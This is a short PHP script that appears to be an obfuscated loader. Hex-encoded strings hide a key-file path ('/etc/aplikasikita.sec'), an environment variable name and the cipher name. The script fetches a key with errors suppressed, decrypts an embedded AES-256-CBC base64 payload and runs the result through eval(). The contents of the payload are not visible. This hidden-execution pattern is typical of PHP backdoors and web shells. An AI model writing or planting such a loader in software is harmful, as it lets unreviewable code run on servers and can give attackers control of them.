<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('k/5E5Kc8O7sI8JKO1LcM2Q==');

$c=base64_decode(

'EGHZBEbS4aoGI7yzXuk2UpQpiAkAauE01Zhs2H/RFsPyH0ANCJKIUlIJvV+l6rJI1pQvUTtKh9QC' .
'Szb8TvPct/XY1ZQBEZjDbwtK0BNelmQ9hOKY3D/q1/wuMMD3Cy1Q9MRUs1yGZCFpuGu0QHHDXJzX' .
'PJpCg/FjpBP5d7QCNs1fLPR9QO5t/nG9GfoKNkmLflzoQir4ZBhPKnR/27Pa3D/Hkvxomrk2rHBf' .
'KWZDvQsyqp6klb8M4KfXcXZb3iEYQaqInohoEgLJ4YnF4+6/YD1DeVMrakkOuC57yQVwkqXQ4cTS' .
'hJqJqhxtQV2G5mOXkhF5LmjkbN3weRTOCLDC4zGx5QajHYK/8Sd5medcY9+13ZJO7k6iVU5nJy5B' .
'Wl2Ul3bL2fff6eWXMRBa5WzsmOnIRJswk86QT0bliOrjbDNP0J+Jx4Inxd4PnO9+wW24zcBuyOKj' .
'RMynFck4a1P3S5ld28OPU9HuTjpFB96mEAVWljqx+bUZEOvSpScztSOSWflQbJiTKZN0EMPN2hF4' .
'R9h1O+l0m7dINXm4XKMU9x4='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

